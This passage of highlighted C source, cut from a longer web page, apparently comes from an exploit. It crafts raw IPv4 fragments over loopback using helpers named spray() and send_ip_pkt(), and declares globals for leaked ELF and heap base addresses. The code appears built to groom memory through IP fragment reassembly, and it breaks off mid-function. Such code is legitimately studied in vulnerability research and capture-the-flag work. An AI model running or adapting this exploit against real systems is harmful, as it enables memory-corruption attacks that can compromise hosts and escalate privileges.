class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span>      <span class="hljs-comment">// struct addrinfo</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span>  <span class="hljs-comment">// needed for socket(), uint8_t, uint16_t, uint32_t</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span> <span class="hljs-comment">// needed for socket()</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span> <span class="hljs-comment">// IPPROTO_RAW, IPPROTO_IP, IPPROTO_TCP, INET_ADDRSTRLEN</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/ip.h&gt;</span> <span class="hljs-comment">// struct ip and IP_MAXPACKET (which is 65535)</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/ip_icmp.h&gt;</span> <span class="hljs-comment">// struct icmp, ICMP_ECHO</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __FAVOR_BSD          <span class="hljs-comment">// Use BSD format of tcp header</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/tcp.h&gt;</span>     <span class="hljs-comment">// struct tcphdr</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span>       <span class="hljs-comment">// inet_pton() and inet_ntop()</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span>       <span class="hljs-comment">// macro ioctl is defined</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/ioctls.h&gt;</span>     <span class="hljs-comment">// defines values for argument &quot;request&quot; of ioctl.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span>          <span class="hljs-comment">// struct ifreq</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_ether.h&gt;</span>  <span class="hljs-comment">// ETH_P_IP = 0x0800, ETH_P_IPV6 = 0x86DD</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_packet.h&gt;</span> <span class="hljs-comment">// struct sockaddr_ll (see man 7 packet)</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/ethernet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span> <span class="hljs-comment">// gettimeofday()</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span> <span class="hljs-comment">// errno, perror()</span></span><br><br><span class="hljs-comment">// Define some constants.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ETH_HDRLEN 14 <span class="hljs-comment">// Ethernet header length</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IP4_HDRLEN 20 <span class="hljs-comment">// IPv4 header length</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TCP_HDRLEN 20 <span class="hljs-comment">// TCP header length, excludes options data</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ICMP_HDRLEN 8 <span class="hljs-comment">// ICMP header length for echo request, excludes data</span></span><br><br><span class="hljs-type">uint64_t</span> elf_base, heap_base, main_thread_heap_base;<br><span class="hljs-type">int</span> stop_flag;<br><span class="hljs-type">char</span>  g_interface[] = <span class="hljs-string">&quot;enp0s3&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip_pkt_info</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> ip_id;<br>    <span class="hljs-type">uint16_t</span> ip_off;<br>    <span class="hljs-type">bool</span> MF;<br>    <span class="hljs-type">uint8_t</span> ip_p;<br>&#125;;<br><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">checksum</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> *addr, <span class="hljs-type">int</span> len)</span> &#123;<br>    <span class="hljs-type">int</span> count = len;<br>    <span class="hljs-keyword">register</span> <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint16_t</span> answer = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Sum up 2-byte values until none or only one byte left.</span><br>    <span class="hljs-keyword">while</span> (count &gt; <span class="hljs-number">1</span>) &#123;<br>        sum += *(addr++);<br>        count -= <span class="hljs-number">2</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Add left-over byte, if any.</span><br>    <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br>        sum += *(<span class="hljs-type">uint8_t</span> *)addr;<br>    &#125;<br><br>    <span class="hljs-comment">// Fold 32-bit sum into 16 bits; we lose information by doing this,</span><br>    <span class="hljs-comment">// increasing the chances of a collision.</span><br>    <span class="hljs-comment">// sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)</span><br>    <span class="hljs-keyword">while</span> (sum &gt;&gt; <span class="hljs-number">16</span>) &#123;<br>        sum = (sum &amp; <span class="hljs-number">0xffff</span>) + (sum &gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// Checksum is one&#x27;s compliment of sum.</span><br>    answer = ~sum;<br><br>    <span class="hljs-keyword">return</span> (answer);<br>&#125;<br><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">icmp4_checksum</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> icmp icmphdr, <span class="hljs-type">uint8_t</span> *payload, <span class="hljs-type">int</span> payloadlen)</span> &#123;<br>    <span class="hljs-type">char</span> buf[IP_MAXPACKET];<br>    <span class="hljs-type">char</span> *ptr;<br>    <span class="hljs-type">int</span> chksumlen = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i;<br><br>    ptr = &amp;buf[<span class="hljs-number">0</span>]; <span class="hljs-comment">// ptr points to beginning of buffer buf</span><br><br>    <span class="hljs-built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_type, <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_type));<br>    ptr += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_type);<br>    chksumlen += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_type);<br><br>    <span class="hljs-comment">// Copy Message Code to buf (8 bits)</span><br>    <span class="hljs-built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_code, <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_code));<br>    ptr += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_code);<br>    chksumlen += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_code);<br><br>    <span class="hljs-comment">// Copy ICMP checksum to buf (16 bits)</span><br>    <span class="hljs-comment">// Zero, since we don&#x27;t know it yet</span><br>    *ptr = <span class="hljs-number">0</span>;<br>    ptr++;<br>    *ptr = <span class="hljs-number">0</span>;<br>    ptr++;<br>    chksumlen += <span class="hljs-number">2</span>;<br><br>    <span class="hljs-comment">// Copy Identifier to buf (16 bits)</span><br>    <span class="hljs-built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_id, <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_id));<br>    ptr += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_id);<br>    chksumlen += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_id);<br><br>    <span class="hljs-comment">// Copy Sequence Number to buf (16 bits)</span><br>    <span class="hljs-built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_seq, <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_seq));<br>    ptr += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_seq);<br>    chksumlen += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_seq);<br><br>    <span class="hljs-comment">// Copy payload to buf</span><br>    <span class="hljs-built_in">memcpy</span>(ptr, payload, payloadlen);<br>    ptr += payloadlen;<br>    chksumlen += payloadlen;<br><br>    <span class="hljs-comment">// Pad to the next 16-bit boundary</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; payloadlen % <span class="hljs-number">2</span>; i++, ptr++) &#123;<br>        *ptr = <span class="hljs-number">0</span>;<br>        ptr++;<br>        chksumlen++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> checksum((<span class="hljs-type">uint16_t</span> *)buf, chksumlen);<br>&#125;<br><br><span class="hljs-type">uint8_t</span> *<span class="hljs-title function_">malloc_8</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">if</span>(size &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc 8 failed,size &lt; 0.&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-type">uint8_t</span> *tmp;<br>    tmp = (<span class="hljs-type">uint8_t</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    <span class="hljs-keyword">if</span>(tmp == <span class="hljs-literal">NULL</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc 8 error.&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">memset</span>(tmp,<span class="hljs-number">0</span>,size);<br>    <span class="hljs-keyword">return</span> tmp;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">uint16_t</span> *<span class="hljs-title function_">malloc_16</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">if</span>(size &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc 16 failed,size &lt; 0.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-type">uint16_t</span> *tmp;<br>    tmp = (<span class="hljs-type">uint16_t</span> *)<span class="hljs-built_in">malloc</span>(size*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>));<br>    <span class="hljs-keyword">if</span>(tmp == <span class="hljs-literal">NULL</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc 16 error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">memset</span>(tmp,<span class="hljs-number">0</span>,size*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>));<br>    <span class="hljs-keyword">return</span> tmp;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> *<span class="hljs-title function_">malloc_32</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">if</span>(size &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc 32 failed,size &lt; 0.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-type">uint32_t</span> *tmp;<br>    tmp = (<span class="hljs-type">uint32_t</span> *)<span class="hljs-built_in">malloc</span>(size*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint32_t</span>));<br>    <span class="hljs-keyword">if</span>(tmp == <span class="hljs-literal">NULL</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc 32 error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">memset</span>(tmp,<span class="hljs-number">0</span>,size*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint32_t</span>));<br>    <span class="hljs-keyword">return</span> tmp;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">char</span> *<span class="hljs-title function_">malloc_char</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">if</span>(size &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc char failed,size &lt; 0.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-type">char</span> *tmp;<br>    tmp = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));<br>    <span class="hljs-keyword">if</span>(tmp == <span class="hljs-literal">NULL</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc char error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">memset</span>(tmp,<span class="hljs-number">0</span>,size*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));<br>    <span class="hljs-keyword">return</span> tmp;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> spray_id, <span class="hljs-type">int</span> spray_size)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip</span> <span class="hljs-title">iphdr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> <span class="hljs-title">tcphdr</span>;</span><br>    <span class="hljs-type">char</span> *source_ip;<br>    <span class="hljs-type">char</span> *destion_ip;<br>    <span class="hljs-type">char</span> *interface;<br>    <span class="hljs-type">uint8_t</span> *packet;<br>    <span class="hljs-type">uint32_t</span> *ip_flags;<br>    <span class="hljs-type">uint32_t</span> *tcp_flags;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span><br><br>    packet = malloc_8(IP_MAXPACKET);<br>    source_ip = malloc_char(INET_ADDRSTRLEN);<br>    destion_ip = malloc_char(INET_ADDRSTRLEN);<br>    interface = malloc_char(<span class="hljs-number">30</span>);<br>    ip_flags = malloc_32(<span class="hljs-number">4</span>);<br>    tcp_flags = malloc_32(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">strcpy</span>(interface, g_interface);<br><br>    <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));<br>    <span class="hljs-built_in">memcpy</span>(ifr.ifr_name, interface, <span class="hljs-keyword">sizeof</span>(ifr.ifr_name));<br><br>    <span class="hljs-type">int</span> if_sd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);<br>    <span class="hljs-keyword">if</span>(if_sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] socket interface failed. ---spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ioctl(if_sd, SIOCGIFINDEX, &amp;(ifr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] ioctl find index error. ---spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    close(if_sd);<br><br>    <span class="hljs-built_in">strcpy</span>(source_ip,<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(destion_ip,<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br><br>    iphdr.ip_v = <span class="hljs-number">4</span>;<br>    iphdr.ip_hl = IP4_HDRLEN/<span class="hljs-number">4</span>;<br>    iphdr.ip_tos = <span class="hljs-number">0</span>;<br>    iphdr.ip_len = htons(spray_size);<br>    iphdr.ip_id = htons(spray_id);<br>    iphdr.ip_ttl = <span class="hljs-number">0xFF</span>;<br>    iphdr.ip_p = <span class="hljs-number">0xFF</span>;<br><br>    ip_flags[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    ip_flags[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    ip_flags[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;<br>    ip_flags[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>    iphdr.ip_off = htons((ip_flags[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">15</span>) + (ip_flags[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">14</span>) + (ip_flags[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">13</span>) + (ip_flags[<span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">12</span>) + <span class="hljs-number">0</span>);<br>    <br>    inet_pton(AF_INET, source_ip, &amp;(iphdr.ip_src));<br>    inet_pton(AF_INET, destion_ip, &amp;(iphdr.ip_dst));<br>    iphdr.ip_sum = <span class="hljs-number">0</span>;<br>    iphdr.ip_sum = checksum((<span class="hljs-type">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);<br><br>    <span class="hljs-built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN);<br><br>    <span class="hljs-type">uint8_t</span> payload[spray_size - IP4_HDRLEN];<br>    <span class="hljs-built_in">memset</span>(payload, <span class="hljs-number">0</span>, spray_size - IP4_HDRLEN);<br>    <span class="hljs-built_in">memcpy</span>(packet + IP4_HDRLEN, payload, spray_size - IP4_HDRLEN);<br><br>    <span class="hljs-built_in">memset</span>(&amp;<span class="hljs-built_in">sin</span>, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in));<br>    <span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br>    <span class="hljs-built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;<br><br>    <span class="hljs-type">int</span> sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<br>    <span class="hljs-keyword">if</span>(sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] socket failed. ---spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr,<span class="hljs-keyword">sizeof</span>(ifr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] setsockopt failed. ---spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(sendto(sd, packet, spray_size, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;<span class="hljs-built_in">sin</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] sendto failed. ---spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    close(sd);<br><br>    <span class="hljs-built_in">free</span>(packet);<br>    <span class="hljs-built_in">free</span>(source_ip);<br>    <span class="hljs-built_in">free</span>(destion_ip);<br>    <span class="hljs-built_in">free</span>(interface);<br>    <span class="hljs-built_in">free</span>(ip_flags);<br>    <span class="hljs-built_in">free</span>(tcp_flags);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_ip_pkt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ip_pkt_info *pkt_info, <span class="hljs-type">uint8_t</span> *payload, <span class="hljs-type">int</span> payload_len)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip</span> <span class="hljs-title">iphdr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> <span class="hljs-title">tcphdr</span>;</span><br>    <span class="hljs-type">char</span> *source_ip;<br>    <span class="hljs-type">char</span> *destion_ip;<br>    <span class="hljs-type">char</span> *interface;<br>    <span class="hljs-type">uint8_t</span> *packet;<br>    <span class="hljs-type">uint32_t</span> *ip_flags;<br>    <span class="hljs-type">uint32_t</span> *tcp_flags;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span><br><br>    packet = malloc_8(IP_MAXPACKET);<br>    source_ip = malloc_char(INET_ADDRSTRLEN);<br>    destion_ip = malloc_char(INET_ADDRSTRLEN);<br>    interface = malloc_char(<span class="hljs-number">30</span>);<br>    ip_flags = malloc_32(<span class="hljs-number">4</span>);<br>    tcp_flags = malloc_32(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">strcpy</span>(interface, g_interface);<br><br>    <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));<br>    <span class="hljs-built_in">memcpy</span>(ifr.ifr_name, interface, <span class="hljs-keyword">sizeof</span>(ifr.ifr_name));<br><br>    <span class="hljs-type">int</span> if_sd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);<br>    <span class="hljs-keyword">if</span>(if_sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] socket interface failed. ---send_ip_pkt&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ioctl(if_sd, SIOCGIFINDEX, &amp;(ifr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] ioctl find index error. ---send_ip_pkt&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    close(if_sd);<br><br>    <span class="hljs-built_in">strcpy</span>(source_ip,<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(destion_ip,<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br><br>    iphdr.ip_v = <span class="hljs-number">4</span>;<br>    iphdr.ip_hl = IP4_HDRLEN/<span class="hljs-number">4</span>;<br>    iphdr.ip_tos = <span class="hljs-number">0</span>;<br>    iphdr.ip_len = htons(IP4_HDRLEN + payload_len);<br>    iphdr.ip_id = htons(pkt_info-&gt;ip_id);<br>    iphdr.ip_ttl = <span class="hljs-number">0xFF</span>;<br>    iphdr.ip_p = pkt_info-&gt;ip_p;<br><br>    ip_flags[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    ip_flags[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    ip_flags[<span class="hljs-number">2</span>] = pkt_info-&gt;MF;<br>    ip_flags[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>    iphdr.ip_off = htons((ip_flags[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">15</span>) + (ip_flags[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">14</span>) + (ip_flags[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">13</span>) + (pkt_info-&gt;ip_off &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0</span>);<br>    <br>    inet_pton(AF_INET, source_ip, &amp;(iphdr.ip_src));<br>    inet_pton(AF_INET, destion_ip, &amp;(iphdr.ip_dst));<br>    iphdr.ip_sum = <span class="hljs-number">0</span>;<br>    iphdr.ip_sum = checksum((<span class="hljs-type">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);<br><br>    <span class="hljs-built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN);<br>    <span class="hljs-built_in">memcpy</span>(packet + IP4_HDRLEN, payload, payload_len);<br><br>    <span class="hljs-built_in">memset</span>(&amp;<span class="hljs-built_in">sin</span>, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in));<br>    <span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br>    <span class="hljs-built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;<br><br>    <span class="hljs-type">int</span> sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<br>    <span class="hljs-keyword">if</span>(sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] socket failed. ---send_ip_pkt&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr,<span 